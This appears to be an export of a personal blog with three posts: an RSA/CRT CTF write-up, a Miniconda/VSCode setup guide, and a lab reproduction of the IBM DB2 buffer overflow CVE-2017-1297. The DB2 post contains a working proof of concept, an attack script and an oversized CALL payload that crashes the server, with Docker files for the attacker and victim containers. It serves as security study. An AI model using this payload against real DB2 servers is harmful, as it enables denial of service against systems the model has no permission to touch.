<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>WriteUp-CTFHub-Quick Math</title>
    <url>/2024/02/04/WriteUp-CTFHub-Quick-Math/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h2><p>Ben has encrypted a message with the same value of â€˜eâ€™ for 3 public moduli - n1 &#x3D; 86812553978993 n2 &#x3D; 81744303091421 n3 &#x3D; 83695120256591 and got the cipher texts - c1 &#x3D; 8875674977048 c2 &#x3D; 70744354709710 c3 &#x3D; 29146719498409. Find the original message. (Wrap it with csictf{})</p>
<h2 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="é¢˜ç›®è€ƒç‚¹"></a>é¢˜ç›®è€ƒç‚¹</h2><ul>
<li>RSA</li>
<li>ä¸­å›½å‰©ä½™å®šç†</li>
</ul>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><ul>
<li>ç”±é¢˜ç›®å’ŒRSAåŸç†å¯çŸ¥ï¼š  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=m^3 mod n1</span><br><span class="line">c2=m^3 mod n2</span><br><span class="line">c3=m^3 mod n3</span><br><span class="line">ğŸ‘‡</span><br><span class="line">m^3 = c1 mod n1</span><br><span class="line">m^3 = c2 mod n2</span><br><span class="line">m^3 = c3 mod n3</span><br></pre></td></tr></table></figure></li>
<li>æ ¹æ®ä¸­å›½å‰©ä½™å®šç†ï¼Œå¯ä»¥æ±‚å‡ºm^3ï¼Œç„¶åå¼€ç«‹æ–¹æ ¹å³å¯å¾—åˆ°m</li>
<li>pythonä»£ç ï¼š  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥æ‰€éœ€çš„æ¨¡å—å’Œå‡½æ•°</span></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSAåŠ å¯†çš„æŒ‡æ•°e</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># ä¸‰ä¸ªä¸åŒçš„æ¨¡æ•°Nå’Œå¯¹åº”çš„å¯†æ–‡C</span></span><br><span class="line">N = [<span class="number">86812553978993</span>, <span class="number">81744303091421</span>, <span class="number">83695120256591</span>]</span><br><span class="line">C = [<span class="number">8875674977048</span>, <span class="number">70744354709710</span>, <span class="number">29146719498409</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è§£å†³æ¨¡æ•°ä¸åŒçš„åŒä½™æ–¹ç¨‹ç»„</span></span><br><span class="line">resultant, mod = crt(N,C)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—resultantçš„eæ¬¡æ ¹ï¼Œå³å¯¹resultantè¿›è¡Œeæ¬¡æ–¹æ ¹è¿ç®—</span></span><br><span class="line">value, is_perfect = iroot(resultant,e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è®¡ç®—å¾—åˆ°çš„æ˜æ–‡å€¼è½¬æ¢æˆå­—èŠ‚å¹¶æ‰“å°å‡ºæ¥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(value)).decode())</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csictf&#123;h45t4d&#125;</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://ctftime.org/writeup/22431">CTFtime.org &#x2F; csictf 2020 &#x2F; Quick Math &#x2F; Writeup</a></li>
<li>ä¸­å›½å‰©ä½™å®šç†</li>
</ul>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Miniconda+Vscode Python ç¯å¢ƒç®¡ç†</title>
    <url>/2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="0-Miniconda-å®‰è£…"><a href="#0-Miniconda-å®‰è£…" class="headerlink" title="0 Miniconda å®‰è£…"></a>0 Miniconda å®‰è£…</h2><ul>
<li>ä¸‹è½½å®‰è£…ï¼Œå¯ä»¥å®‰è£…Minicondaï¼Œä¹Ÿå¯ä»¥å®‰è£…Anacondaï¼ŒMinicondaè½»é‡çº§ã€‚</li>
<li>å®‰è£…é€‰é¡¹ï¼šä¸€è·¯nextï¼Œæœ‰ä¸€é¡µpathå¤„ï¼Œå…¨é€‰ã€‚</li>
</ul>
<h2 id="1-Vscodeé…ç½®"><a href="#1-Vscodeé…ç½®" class="headerlink" title="1 Vscodeé…ç½®"></a>1 Vscodeé…ç½®</h2><ul>
<li>å®‰è£…Pythonæ‰©å±•</li>
<li>è®¾ç½®æ‰©å±•ï¼Œå°†conda pathæ·»åŠ åˆ°è®¾ç½®ä¸­<br>  <img src="/2024/01/07/Miniconda-Vscode-Python-%E7%8E%AF%E5%A2%83%E7%AE%A1%E7%90%86/condapath.png" alt="Conda Path"></li>
<li>æ–°å»ºç»ˆç«¯åï¼Œé»˜è®¤Pythonç¯å¢ƒä¸ºminicondaçš„baseè™šæ‹Ÿç¯å¢ƒ</li>
</ul>
<!-- more -->

<h2 id="2-VScodeä¸­ä½¿ç”¨condaç®¡ç†pythonç¯å¢ƒ"><a href="#2-VScodeä¸­ä½¿ç”¨condaç®¡ç†pythonç¯å¢ƒ" class="headerlink" title="2 VScodeä¸­ä½¿ç”¨condaç®¡ç†pythonç¯å¢ƒ"></a>2 VScodeä¸­ä½¿ç”¨condaç®¡ç†pythonç¯å¢ƒ</h2><ul>
<li>åœ¨vscodeä¸­ä½¿ç”¨conda Promptï¼š[ç»ˆç«¯]-&gt;[æ–°å»ºç»ˆç«¯]-&gt;[ï¼‹]-&gt;[command prompt]<ul>
<li>conda info â€“envs æŸ¥çœ‹å½“å‰è™šæ‹Ÿç¯å¢ƒåˆ—è¡¨</li>
<li>conda activate -n envsname å¯åŠ¨è™šæ‹Ÿç¯å¢ƒï¼ˆé»˜è®¤ä¸ºbaseï¼‰</li>
<li>å¯ä»¥çœ‹åˆ°å¯åŠ¨åå‰é¢æœ‰ï¼ˆenvsnameï¼‰</li>
</ul>
</li>
</ul>
<h2 id="3-å¸¸ç”¨condaå‘½ä»¤"><a href="#3-å¸¸ç”¨condaå‘½ä»¤" class="headerlink" title="3 å¸¸ç”¨condaå‘½ä»¤"></a>3 å¸¸ç”¨condaå‘½ä»¤</h2><ul>
<li>æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒ	conda info â€“envs</li>
<li>åˆ›å»ºæ–°ç¯å¢ƒ	conda create -n env_name python&#x3D;x.x</li>
<li>å¯åŠ¨è™šæ‹Ÿç¯å¢ƒ	conda activate env_name</li>
<li>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ	conda deactivate</li>
<li>åˆ é™¤è™šæ‹Ÿç¯å¢ƒ	conda remove -n env_name  â€“all</li>
</ul>
<blockquote>
<p>æœ¬æ–‡å†…å®¹é¦–å‘äºCSDNï¼š<a href="https://blog.csdn.net/weixin_43694227/article/details/124099269">Miniconda+Vscode Python ç¯å¢ƒç®¡ç†</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>Miniconda</tag>
        <tag>Vscode</tag>
        <tag>Pythonç¯å¢ƒç®¡ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-1297æ¼æ´å¤ç°</title>
    <url>/2024/01/14/CVE-2017-1297%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.exploit-db.com/exploits/42260">IBM DB2 9.7&#x2F;10.1&#x2F;10.5&#x2F;11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit</a></p>
<h2 id="æ¼æ´è¯´æ˜"><a href="#æ¼æ´è¯´æ˜" class="headerlink" title="æ¼æ´è¯´æ˜"></a>æ¼æ´è¯´æ˜</h2><blockquote>
<p>IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.</p>
</blockquote>
<h2 id="æ”»å‡»é•œåƒæ„å»º"><a href="#æ”»å‡»é•œåƒæ„å»º" class="headerlink" title="æ”»å‡»é•œåƒæ„å»º"></a>æ”»å‡»é•œåƒæ„å»º</h2><ul>
<li><p><code>exp.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] æ­£åœ¨å‡†å¤‡è¿æ¥ç›®æ ‡db2æ•°æ®åº“&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$2</span></span><br><span class="line">db2 catalog tcpip4 node remotedb remote <span class="variable">$1</span> server <span class="variable">$2</span></span><br><span class="line">db2 catalog database testdb3 as testdb33 at node remotedb</span><br><span class="line">db2 connect to testdb33 user db2inst1 using 123456</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] å·²è¿æ¥æˆåŠŸç›®æ ‡æ•°æ®åº“&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] æ­£åœ¨æŸ¥è¯¢ç›®æ ‡æ•°æ®åº“æ•°æ®&quot;</span></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æ•°æ®</span></span><br><span class="line">db2 -f select.sql</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] æ­£åœ¨å‘é€PoC&quot;</span></span><br><span class="line"><span class="comment"># å‘é€ PoC</span></span><br><span class="line">db2 -f crash.sql</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] PoCå‘é€æˆåŠŸ&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] å†æ¬¡å°è¯•æŸ¥è¯¢æ•°æ®åº“&quot;</span></span><br><span class="line">db2 -f select.sql</span><br></pre></td></tr></table></figure></li>
<li><p><code>select.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tbl4</span><br></pre></td></tr></table></figure></li>
<li><p><code>crash.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CALL</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;</span><br></pre></td></tr></table></figure></li>
<li><p><code>entrypoint.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class="built_in">echo</span> <span class="string">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class="built_in">echo</span> pass</span><br><span class="line"><span class="built_in">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class="line">./db2icrt -u db2inst1 db2inst1 </span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2stop&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;finish&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Remote IP: <span class="variable">$REMOTE_IP</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Remote PORT: <span class="variable">$REMOTE_PORT</span>&quot;</span></span><br><span class="line"><span class="comment"># STR=$(echo $3 | cut -d &quot;[&quot; -f 2 |cut -d  &quot;]&quot; -f 1 | cut -d &quot;&#x27;&quot; -f 2)</span></span><br><span class="line"><span class="comment"># echo $STR</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;cd / &amp;&amp; bash /exp.sh <span class="variable">$REMOTE_IP</span> <span class="variable">$REMOTE_PORT</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure></li>
<li><p><code>Dockerfile</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM centos:7.2.1511</span><br><span class="line"></span><br><span class="line">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class="line"><span class="comment"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN <span class="built_in">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN chmod 644 /etc/sysctl.conf</span></span><br><span class="line"><span class="comment"># RUN sysctl -p </span></span><br><span class="line">RUN ipcs -l</span><br><span class="line"></span><br><span class="line">RUN groupadd -g 901 db2iadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 902 db2fadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 903 dasadm1  &amp;&amp; \</span><br><span class="line">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \ </span><br><span class="line">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \</span><br><span class="line">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN cd server &amp;&amp; ./db2prereqcheck &amp;&amp;  echo &#x27;ESE&#x27; | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass</span></span><br><span class="line"><span class="comment"># RUN cd /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  &amp;&amp;\</span></span><br><span class="line"><span class="comment">#     ./db2icrt -u db2inst1 db2inst1 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN db2 create database KHYX_YS using codeset GBK territory CN</span></span><br><span class="line"><span class="comment"># RUN db2 create database KHYX_YS </span></span><br><span class="line"><span class="comment"># RUN db2set â€“all</span></span><br><span class="line">COPY entrypoint.sh /entrypoint.sh</span><br><span class="line">COPY exp.sh /exp.sh</span><br><span class="line">COPY select.sql /select.sql</span><br><span class="line">COPY crash.sql /crash.sql</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">chmod</span> +x /entrypoint.sh</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /exp.sh</span><br><span class="line"></span><br><span class="line">ENV REMOTE_IP=<span class="variable">$&#123;REMOTE_IP&#125;</span></span><br><span class="line">ENV REMOTE_PORT=<span class="variable">$&#123;REMOTE_PORT&#125;</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/entrypoint.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXPOSE 60000</span><br></pre></td></tr></table></figure>
</li>
<li><p>é•œåƒæ„å»ºï¼ˆè·å¾—docker_image_id_1ï¼‰</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build .</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="è¢«æµ‹ç¯å¢ƒæ­å»º"><a href="#è¢«æµ‹ç¯å¢ƒæ­å»º" class="headerlink" title="è¢«æµ‹ç¯å¢ƒæ­å»º"></a>è¢«æµ‹ç¯å¢ƒæ­å»º</h2><ul>
<li><p><code>create_table.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE testdb3</span><br><span class="line"><span class="keyword">connect</span> <span class="keyword">to</span> testdb3</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl4 (stu_name <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY)</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl4 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> stu_age <span class="type">CHAR</span>(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;bob&#x27;</span>,<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;amy&#x27;</span>,<span class="string">&#x27;13&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;france&#x27;</span>,<span class="string">&#x27;56&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;frank&#x27;</span>,<span class="string">&#x27;41&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl4</span><br></pre></td></tr></table></figure></li>
<li><p><code>entrypoint.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class="built_in">echo</span> <span class="string">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class="built_in">echo</span> pass</span><br><span class="line"><span class="built_in">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class="line">./db2icrt -u db2inst1 db2inst1 </span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2stop&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;cd / &amp;&amp; db2 -f create_table.sql&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Dockerfile</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM centos:7.2.1511</span><br><span class="line"></span><br><span class="line">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class="line"><span class="comment"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN <span class="built_in">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class="line"></span><br><span class="line">RUN ipcs -l</span><br><span class="line"></span><br><span class="line">RUN groupadd -g 901 db2iadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 902 db2fadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 903 dasadm1  &amp;&amp; \</span><br><span class="line">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \ </span><br><span class="line">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \</span><br><span class="line">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class="line"></span><br><span class="line">COPY entrypoint.sh /entrypoint.sh</span><br><span class="line"><span class="comment"># COPY exp.sh /exp.sh</span></span><br><span class="line">COPY create_table.sql /create_table.sql</span><br><span class="line"><span class="comment"># COPY crash.sql /crash.sql</span></span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">chmod</span> +x /entrypoint.sh</span><br><span class="line"><span class="comment"># RUN chmod +x /exp.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ENV REMOTE_IP=$&#123;REMOTE_IP&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/entrypoint.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 60000</span><br><span class="line"><span class="comment"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>é•œåƒæ„å»ºï¼ˆè·å¾—docker_image_id_2ï¼‰</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build.</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="è¢«æµ‹ç¯å¢ƒå®¹å™¨å¯åŠ¨ï¼ˆæ¯”è¾ƒæ…¢ï¼‰"><a href="#è¢«æµ‹ç¯å¢ƒå®¹å™¨å¯åŠ¨ï¼ˆæ¯”è¾ƒæ…¢ï¼‰" class="headerlink" title="è¢«æµ‹ç¯å¢ƒå®¹å™¨å¯åŠ¨ï¼ˆæ¯”è¾ƒæ…¢ï¼‰"></a>è¢«æµ‹ç¯å¢ƒå®¹å™¨å¯åŠ¨ï¼ˆæ¯”è¾ƒæ…¢ï¼‰</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it -d --privileged -p 60000:60000  docker_image_id_2</span><br></pre></td></tr></table></figure>

<h2 id="æ”»å‡»è„šæœ¬æ‰§è¡Œ"><a href="#æ”»å‡»è„šæœ¬æ‰§è¡Œ" class="headerlink" title="æ”»å‡»è„šæœ¬æ‰§è¡Œ"></a>æ”»å‡»è„šæœ¬æ‰§è¡Œ</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># REMOTE_IPä¸ºè¢«æµ‹ç¯å¢ƒçš„ip</span></span><br><span class="line"><span class="comment"># REMOTE_PORTä¸ºè¢«æµ‹ç¯å¢ƒçš„ç«¯å£</span></span><br><span class="line"><span class="comment"># docker_image_id_1 ä¸ºæ”»å‡»é•œåƒid</span></span><br><span class="line"></span><br><span class="line">docker run --network host -it -d --privileged -e REMOTE_IP=<span class="string">&#x27;192.168.33.44&#x27;</span> -e REMOTE_PORT=<span class="string">&#x27;60000&#x27;</span> docker_image_id_1</span><br></pre></td></tr></table></figure>


